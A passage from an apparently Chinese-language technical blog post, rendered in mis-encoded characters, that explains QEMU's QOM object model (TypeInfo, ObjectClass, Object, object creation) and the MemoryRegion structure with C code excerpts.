å½“ä¸­ä½¿ç”¨æˆå‘˜åµŒå¥—çš„æ–¹å¼æ¥å®Œæˆç±»çš„ç»§æ‰¿ï¼Œçˆ¶ç±»ä½œä¸ºç±»ç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªæˆå‘˜ <code>parent</code> è€Œå­˜åœ¨ï¼Œå› æ­¤ä¹Ÿä¸æ”¯æŒå¤šç»§æ‰¿</p><blockquote><p>å‚è§è¿™ä¸ª<a href="https://www.linux-kvm.org/images/f/f6/2012-forum-QOM_CPU.pdf">ppt</a></p></blockquote><h3 id="Iã€TypeInfo-ç±»çš„åŸºæœ¬å±æ€§"><a href="#Iã€TypeInfo-ç±»çš„åŸºæœ¬å±æ€§" class="headerlink" title="Iã€TypeInfo - ç±»çš„åŸºæœ¬å±æ€§"></a>Iã€TypeInfo - ç±»çš„åŸºæœ¬å±æ€§</h3><p><code>TypeInfo</code> è¿™ä¸€ç»“æ„ä½“ç”¨æ¥å®šä¹‰ä¸€ä¸ªã€Œç±»ã€çš„åŸºæœ¬å±æ€§ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>include/qom/object.h</code> å½“ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * TypeInfo:</span><br><span class="hljs-comment"> * @name: ç±»å‹å.</span><br><span class="hljs-comment"> * @parent: çˆ¶ç±»å‹å.</span><br><span class="hljs-comment"> * @instance_size: å¯¹è±¡å¤§å° (#Object çš„è¡ç”Ÿç‰©). </span><br><span class="hljs-comment"> *   è‹¥ @instance_size ä¸º 0, åˆ™å¯¹è±¡çš„å¤§å°ä¸ºå…¶çˆ¶ç±»çš„å¤§å°</span><br><span class="hljs-comment"> * @instance_init: è¯¥å‡½æ•°è¢«è°ƒç”¨ä»¥åˆå§‹åŒ–å¯¹è±¡ï¼ˆè¯‘æ³¨ï¼šæ„é€ å‡½æ•°ï¼‰. </span><br><span class="hljs-comment"> *   ï¼ˆè¯‘æ³¨ï¼šè°ƒç”¨å‰ï¼‰çˆ¶ç±»å·²è¢«åˆå§‹åŒ–ï¼Œå› æ­¤å­ç±»åªéœ€è¦åˆå§‹åŒ–ä»–è‡ªå·±çš„æˆå‘˜ã€‚</span><br><span class="hljs-comment"> * @instance_post_init: è¯¥å‡½æ•°è¢«è°ƒç”¨ä»¥ç»“æŸä¸€ä¸ªå¯¹è±¡çš„åˆå§‹åŒ–ï¼Œ</span><br><span class="hljs-comment"> *   åœ¨æ‰€æœ‰çš„ @instance_init å‡½æ•°è¢«è°ƒç”¨ä¹‹å.</span><br><span class="hljs-comment"> * @instance_finalize: è¯¥å‡½æ•°åœ¨å¯¹è±¡è¢«ææ„æ—¶è°ƒç”¨. å…¶åœ¨</span><br><span class="hljs-comment"> *   çˆ¶ç±»çš„ @instance_finalize è¢«è°ƒç”¨ä¹‹å‰è¢«è°ƒç”¨.</span><br><span class="hljs-comment"> *   åœ¨è¯¥å‡½æ•°ä¸­ä¸€ä¸ªå¯¹è±¡åº”å½“ä»…é‡Šæ”¾è¯¥å¯¹è±¡ç‰¹æœ‰çš„æˆå‘˜ã€‚</span><br><span class="hljs-comment"> * @abstract: è‹¥è¯¥åŸŸä¸ºçœŸï¼Œåˆ™è¯¥ç±»ä¸ºä¸€ä¸ªè™šç±»ï¼Œä¸èƒ½è¢«ç›´æ¥å®ä¾‹åŒ–ã€‚</span><br><span class="hljs-comment"> * @class_size: è¿™ä¸ªå¯¹è±¡çš„ç±»å¯¹è±¡çš„å¤§å° (#Object çš„è¡ç”Ÿç‰©)</span><br><span class="hljs-comment"> *   è‹¥ @class_size ä¸º 0, åˆ™ç±»çš„å¤§å°ä¸ºå…¶çˆ¶ç±»çš„å¤§å°ã€‚</span><br><span class="hljs-comment"> *   è¿™å…è®¸ä¸€ä¸ªç±»å‹åœ¨æ²¡æœ‰æ·»åŠ é¢å¤–çš„è™šå‡½æ•°æ—¶é¿å…å®ç°ä¸€ä¸ªæ˜¾å¼çš„ç±»å‹ã€‚</span><br><span class="hljs-comment"> * @class_init: è¯¥å‡½æ•°åœ¨æ‰€æœ‰çˆ¶ç±»åˆå§‹åŒ–ç»“æŸåè¢«è°ƒç”¨ï¼Œ</span><br><span class="hljs-comment"> *   ä»¥å…è®¸ä¸€ä¸ªç±»è®¾ç½®ä»–çš„é»˜è®¤è™šæ–¹æ³•æŒ‡é’ˆ.</span><br><span class="hljs-comment"> *   è¿™ä¹Ÿå…è®¸è¯¥å‡½æ•°é‡å†™çˆ¶ç±»çš„è™šæ–¹æ³•ã€‚</span><br><span class="hljs-comment"> * @class_base_init: åœ¨æ‰€æœ‰çš„çˆ¶ç±»è¢«åˆå§‹åŒ–åã€ä½†</span><br><span class="hljs-comment"> *   åœ¨ç±»è‡ªèº«åˆå§‹åŒ–å‰ï¼Œä¸ºæ‰€æœ‰çš„åŸºç±»è°ƒç”¨è¯¥å‡½æ•°ã€‚</span><br><span class="hljs-comment"> *   è¯¥å‡½æ•°ç”¨ä»¥æ’¤é”€ä»çˆ¶ç±» memcpy åˆ°å­ç±»çš„å½±å“.</span><br><span class="hljs-comment"> * @class_data: ä¼ é€’ç»™ @class_init ä¸ @class_base_init çš„æ•°æ®,</span><br><span class="hljs-comment"> *   è¿™ä¼šåœ¨å»ºç«‹åŠ¨æ€ç±»å‹æ—¶æœ‰ç”¨ã€‚</span><br><span class="hljs-comment"> * @interfaces: ä¸è¿™ä¸ªç±»å‹ç›¸å…³çš„æ¥å£. </span><br><span class="hljs-comment"> *   å…¶åº”å½“æŒ‡å‘ä¸€ä¸ªä»¥ 0 å¡«å……å…ƒç´ ç»“å°¾çš„é™æ€æ•°ç»„</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TypeInfo</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *parent;<br><br>    <span class="hljs-type">size_t</span> instance_size;<br>    <span class="hljs-type">void</span> (*instance_init)(Object *obj);<br>    <span class="hljs-type">void</span> (*instance_post_init)(Object *obj);<br>    <span class="hljs-type">void</span> (*instance_finalize)(Object *obj);<br><br>    <span class="hljs-type">bool</span> abstract;<br>    <span class="hljs-type">size_t</span> class_size;<br><br>    <span class="hljs-type">void</span> (*class_init)(ObjectClass *klass, <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> (*class_base_init)(ObjectClass *klass, <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> *class_data;<br><br>    InterfaceInfo *interfaces;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨ Qemu ä¸­è¦å®šä¹‰ä¸€ä¸ªã€Œç±»ã€çš„æ—¶å€™ï¼Œæˆ‘ä»¬å®é™…ä¸Šéœ€è¦å®šä¹‰ä¸€ä¸ª TypeInfo ç±»å‹çš„å˜é‡ï¼Œä¾‹å¦‚ä¸‹é¢å°±æ˜¯ä¸€ä¸ªåœ¨ Qemu å®šä¹‰ä¸€ä¸ªè‡ªå®šä¹‰ç±»çš„ğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> a3_register_types(<span class="hljs-type">void</span>) &#123;<br>    type_register_static(&amp;a3_type_info);<br>&#125;<br><br>type_init(a3_register_types);<br></code></pre></td></tr></table></figure><p><code>type_init()</code> å…¶å®å°±æ˜¯ <code>constructor</code> è¿™ä¸€ gcc attribute çš„å°è£…ï¼Œå…¶ä½œç”¨å°±æ˜¯å°†ä¸€ä¸ªå‡½æ•°åŠ å…¥åˆ°ä¸€ä¸ª <code>init_array</code> å½“ä¸­ï¼Œåœ¨ Qemu ç¨‹åºå¯åŠ¨æ—¶åœ¨è¿›å…¥åˆ° main å‡½æ•°ä¹‹å‰ä¼šå…ˆè°ƒç”¨ <code>init_array</code> ä¸­çš„å‡½æ•°ï¼Œå› æ­¤è¿™é‡Œä¼šè°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œå…¶ä½œç”¨ä¾¿æ˜¯è°ƒç”¨ <code>type_register_static()</code> å°†æˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»å‹ <code>a3_type_info</code> æ³¨å†Œåˆ°å…¨å±€çš„ç±»å‹è¡¨ä¸­</p><h3 id="IIã€Class-ç±»çš„é™æ€å†…å®¹"><a href="#IIã€Class-ç±»çš„é™æ€å†…å®¹" class="headerlink" title="IIã€Class - ç±»çš„é™æ€å†…å®¹"></a>IIã€Class - ç±»çš„é™æ€å†…å®¹</h3><p>å½“æˆ‘ä»¬é€šè¿‡ä¸€ä¸ª <code>TypeInfo</code> ç»“æ„ä½“å®šä¹‰äº†ä¸€ä¸ªç±»ä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦å®šä¹‰ä¸€ä¸ª Class ç»“æ„ä½“æ¥å®šä¹‰è¿™ä¸ªç±»çš„é™æ€å†…å®¹ï¼ŒåŒ…æ‹¬å‡½æ•°è¡¨ã€é™æ€æˆå‘˜ç­‰ï¼Œå…¶åº”å½“ç»§æ‰¿äºå¯¹åº”çš„ Class ç»“æ„ä½“ç±»å‹ï¼Œä¾‹å¦‚æˆ‘ä»¬è‹¥æ˜¯è¦å®šä¹‰ä¸€ä¸ªæ–°çš„æœºå™¨ç±»ï¼Œåˆ™å…¶ Class åº”å½“ç»§æ‰¿äº <code>MachineClass</code></p><p>æ‰€æœ‰ Class ç»“æ„ä½“ç±»å‹çš„æœ€ç»ˆçš„çˆ¶ç±»éƒ½æ˜¯ <code>ObjectClass</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ObjectClass:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ‰€æœ‰ç±»çš„åŸºç±».  #ObjectClass ä»…åŒ…å«ä¸€ä¸ªæ•´å‹ç±»å‹ handler</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ObjectClass</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    Type type;<br>    GSList *interfaces;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];<br><br>    ObjectUnparent *unparent;<br><br>    GHashTable *properties;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„ğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3Class</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    ObjectClass parent;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®Œæˆ Class çš„å®šä¹‰ä¹‹åæˆ‘ä»¬è¿˜åº”å½“åœ¨å‰é¢å®šä¹‰çš„ <code>a3_type_info</code> ä¸­æ·»åŠ ä¸Š Class size ä¸ Class çš„æ„é€ å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    <span class="hljs-comment">// è¿™é‡Œçš„ oc å‚æ•°ä¾¿æ˜¯æ–°åˆ›å»ºçš„ Classï¼Œå…¨å±€åªæœ‰ä¸€ä¸ªè¯¥å®ä¾‹</span><br>    <span class="hljs-comment">// æˆ‘ä»¬åº”å½“ cast ä¸ºæˆ‘ä»¬è‡ªå·±çš„ Class ç±»å‹ï¼Œä¹‹åå†è¿›è¡Œç›¸åº”æ“ä½œ</span><br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3Class),<br>    .class_init = a3_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IIIã€Object-ç±»çš„å®ä¾‹å¯¹è±¡"><a href="#IIIã€Object-ç±»çš„å®ä¾‹å¯¹è±¡" class="headerlink" title="IIIã€Object - ç±»çš„å®ä¾‹å¯¹è±¡"></a>IIIã€Object - ç±»çš„å®ä¾‹å¯¹è±¡</h3><p>æˆ‘ä»¬è¿˜éœ€è¦å®šä¹‰ä¸€ä¸ªç›¸åº”çš„ Object ç±»å‹æ¥è¡¨ç¤ºä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼Œå…¶åŒ…å«æœ‰è¿™ä¸ªç±»å®é™…çš„å…·ä½“æ•°æ®ï¼Œä¸”åº”å½“ç»§æ‰¿äºå¯¹åº”çš„ Object ç»“æ„ä½“ç±»å‹ï¼Œä¾‹å¦‚æˆ‘ä»¬è‹¥æ˜¯è¦å®šä¹‰ä¸€ä¸ªæ–°çš„æœºå™¨ç±»å‹ï¼Œå…¶å®ä¾‹ç±»å‹åº”å½“ç»§æ‰¿è‡ª <code>MachineState</code></p><p>æ‰€æœ‰ Object ç»“æ„ä½“ç±»å‹çš„æœ€ç»ˆçš„çˆ¶ç±»éƒ½æ˜¯ <code>Object</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Object:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ‰€æœ‰å¯¹è±¡çš„åŸºç±»ã€‚è¯¥å¯¹è±¡çš„ç¬¬ä¸€ä¸ªæˆå‘˜ä¸ºä¸€ä¸ªæŒ‡å‘ #ObjectClass çš„æŒ‡é’ˆã€‚</span><br><span class="hljs-comment"> * å› ä¸º C ä¸­å°†ä¸€ä¸ªç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªæˆå‘˜ç»„ç»‡åœ¨è¯¥ç»“æ„ä½“çš„ 0 å­—èŠ‚èµ·å§‹å¤„ï¼Œ</span><br><span class="hljs-comment"> * åªè¦ä»»ä½•çš„å­ç±»å°†å…¶çˆ¶ç±»ä½œä¸ºç¬¬ä¸€ä¸ªæˆå‘˜ï¼Œæˆ‘ä»¬éƒ½èƒ½ç›´æ¥è½¬åŒ–ä¸ºä¸€ä¸ª #Object.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å› æ­¤, #Object åŒ…å«ä¸€ä¸ªå¯¹å¯¹è±¡ç±»çš„å¼•ç”¨ä½œä¸ºå…¶ç¬¬ä¸€ä¸ªæˆå‘˜ã€‚ </span><br><span class="hljs-comment"> * è¿™å…è®¸åœ¨è¿è¡Œæ—¶è¯†åˆ«å¯¹è±¡çš„çœŸå®ç±»å‹</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    ObjectClass *<span class="hljs-class"><span class="hljs-keyword">class</span>;</span><br>    ObjectFree *<span class="hljs-built_in">free</span>;<br>    GHashTable *properties;<br>    <span class="hljs-type">uint32_t</span> ref;<br>    Object *parent;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    Object parent;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®Œæˆ Object çš„å®šä¹‰ä¹‹åæˆ‘ä»¬è¿˜åº”å½“åœ¨å‰é¢å®šä¹‰çš„ <code>a3_type_info</code> ä¸­æ·»åŠ ä¸Š Object size ä¸ Object çš„æ„é€ å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_object_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// è¿™é‡Œçš„ obj å‚æ•°ä¾¿æ˜¯åŠ¨æ€åˆ›å»ºçš„ç±»å‹å®ä¾‹</span><br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .instance_init = a3_object_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3Object),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3Class),<br>    .class_init = a3_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IVã€ç±»çš„åˆ›å»ºä¸é‡Šæ”¾"><a href="#IVã€ç±»çš„åˆ›å»ºä¸é‡Šæ”¾" class="headerlink" title="IVã€ç±»çš„åˆ›å»ºä¸é‡Šæ”¾"></a>IVã€ç±»çš„åˆ›å»ºä¸é‡Šæ”¾</h3><p>ç±»ä¼¼äºåœ¨ C++ å½“ä¸­ä½¿ç”¨ <code>new</code> ä¸ <code>delete</code> æ¥åˆ›å»ºä¸é‡Šæ”¾ä¸€ä¸ªç±»å®ä¾‹ï¼Œåœ¨ QOM ä¸­æˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>object_new()</code> ä¸ <code>object_delete()</code> æ¥åˆ›å»ºä¸é”€æ¯ä¸€ä¸ª QOM ç±»å®ä¾‹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ <code>åˆ†é…/é‡Šæ”¾ç±»ç©ºé—´ + æ˜¾ç¤ºè°ƒç”¨æ„é€ /ææ„å‡½æ•°</code></p><p>QOM åˆ¤æ–­åˆ›å»ºç±»å®ä¾‹çš„ç±»å‹æ˜¯é€šè¿‡ç±»çš„åå­—ï¼Œå³ <code>TypeInfo-&gt;name</code>ï¼Œå½“åˆ›å»ºç±»å®ä¾‹æ—¶ Qemu ä¼šéå†æ‰€æœ‰çš„ TypeInfo å¹¶å¯»æ‰¾åå­—åŒ¹é…çš„é‚£ä¸ªï¼Œä»è€Œè°ƒç”¨åˆ°å¯¹åº”çš„æ„é€ å‡½æ•°ï¼Œå¹¶å°†å…¶åŸºç±» <code>Object-&gt;class</code> æŒ‡å‘å¯¹åº”çš„ class</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// create a QOM object</span><br>A3Object *a3obj = object_new(<span class="hljs-string">&quot;a3_type&quot;</span>);<br><span class="hljs-comment">// delete a QOM object</span><br>object_delete(a3obj);<br></code></pre></td></tr></table></figure><h2 id="äºŒã€MemoryRegion-Qemu-ä¸­çš„ä¸€å—å†…å­˜åŒºåŸŸ"><a href="#äºŒã€MemoryRegion-Qemu-ä¸­çš„ä¸€å—å†…å­˜åŒºåŸŸ" class="headerlink" title="äºŒã€MemoryRegion - Qemu ä¸­çš„ä¸€å—å†…å­˜åŒºåŸŸ"></a>äºŒã€MemoryRegion - Qemu ä¸­çš„ä¸€å—å†…å­˜åŒºåŸŸ</h2><p>åœ¨ Qemu å½“ä¸­ä½¿ç”¨ <code>MemoryRegion</code> ç»“æ„ä½“ç±»å‹æ¥è¡¨ç¤ºä¸€å—å…·ä½“çš„ Guest ç‰©ç†å†…å­˜åŒºåŸŸï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>include/exec/memory.h</code> å½“ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/** MemoryRegion:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è¡¨ç¤ºä¸€å—å†…å­˜åŒºåŸŸçš„ä¸€ä¸ªç»“æ„ä½“.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryRegion</span> &#123;</span><br>    Object parent_obj;<br><br>    <span class="hljs-comment">/* private: */</span><br><br>    <span class="hljs-comment">/* The following fields should fit in a cache line */</span><br>    <span class="hljs-type">bool</span> romd_mode;<br>    <span class="hljs-type">bool</span> ram;<br>    <span class="hljs-type">bool</span> subpage;<br>    <span class="hljs-type">bool</span> readonly; <span class="hljs-comment">/* For RAM regions */</span><br>    <span class="hljs-type">bool</span> nonvolatile;<br>    <span class="hljs-type">bool</span> rom_device;<br>    <span class="hljs-type">bool</span> flush_coalesced_mmio;<br>    <span class="hljs-type">bool</span> global_locking;<br>    <span class="hljs-type">uint8_t</span> dirty_log_mask;<br>    <span class="hljs-type">bool</span> is_iommu;<br>    RAMBlock *ram_block;<br>    Object *owner;<br><br>    <span class="hljs-type">const</span> MemoryRegionOps *ops;<br>    <span class="hljs-type">void</span> *opaque;<br>    MemoryRegion *container;<span class="hljs-comment">// æŒ‡å‘çˆ¶ MemoryRegion</span><br>    Int128 size;<span class="hljs-comment">// å†…å­˜åŒºåŸŸå¤§å°</span><br>    hwaddr addr;<span class="hljs-comment">// åœ¨çˆ¶ MR ä¸­çš„åç§»é‡</span><br>    <span class="hljs-type">void</span> (*destructor)(MemoryRegion *mr);<br>    <span class="hljs-type">uint64_t</span> align;<br>    <span class="hljs-type">bool</span> terminates;<br>    <span class="hljs-type">bool</span> ram_device;<br>    <span class="hljs-type">bool</span> enabled;<br>    <span class="hljs-type">bool</span> warning_printed; <span class="hljs-comment">/* For reservations */</span><br>    <span class="hljs-type">uint8_t</span> vga_logging_count;<br>    MemoryRegion *alias;<span class="hljs-comment">// ä»…åœ¨ alias MR ä¸­ï¼ŒæŒ‡å‘å®é™…çš„ MR</span><br>    hwaddr alias_offset;<br>    <span class="hljs-type">int32_t</span> priority;<br>    QTAILQ_HEAD(, MemoryRegion) subregions;<br>    QTAILQ_ENTRY(MemoryRegion) subregions_link;<br>    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">unsigned</span> ioeventfd_nb;<br>    MemoryRegionIoeventfd *ioeventfds;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨ Qemu å½“ä¸­æœ‰ä¸‰ç§ç±»å‹çš„ MemoryRegionï¼š</p><ul><li>MemoryRegion æ ¹ï¼šé€šè¿‡ <code>memory_region_init()</code> è¿›è¡Œåˆå§‹åŒ–ï¼Œå…¶ç”¨ä»¥è¡¨ç¤ºä¸ç®¡ç†ç”±å¤šä¸ª sub-MemoryRegion ç»„æˆçš„ä¸€ä¸ªå†…å­˜åŒºåŸŸï¼Œå¹¶ä¸å®é™…æŒ‡å‘ä¸€å—å†…å­˜åŒºåŸŸï¼Œä¾‹å¦‚ <code>system_memory</code></li><li>MemoryRegion å®ä½“ï¼šé€šè¿‡ <code>memory_region_init_ram()</code> åˆå§‹åŒ–ï¼Œè¡¨ç¤ºå…·ä½“çš„ä¸€å—å¤§å°ä¸º size çš„å†…å­˜ç©ºé—´ï¼ŒæŒ‡å‘ä¸€å—å…·ä½“çš„å†…å­˜</li><li>MemoryRegion åˆ«åï¼šé€šè¿‡ <code>memory_region_init_alias()</code> åˆå§‹åŒ–ï¼Œä½œä¸ºå¦ä¸€ä¸ª MemoryRegion å®ä½“çš„åˆ«åè€Œå­˜åœ¨ï¼Œä¸æŒ‡å‘ä¸€å—å®é™…å†…å­˜</li></ul><p>MR å®¹å™¨ä¸ MR å®ä½“é—´æ„æˆæ ‘å½¢ç»“æ„ï¼Œå…¶ä¸­å®¹å™¨ä¸ºæ ¹èŠ‚ç‚¹è€Œå®ä½“ä¸ºå­èŠ‚ç‚¹ï¼š</p><blockquote><p>ä¸‹å›¾æ¥è‡ªäº<a href="https://richardweiyang-2.gitbook.io/understanding_qemu/00-as/02-memoryregion">è¿™é‡Œ</a></p></blockquote><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 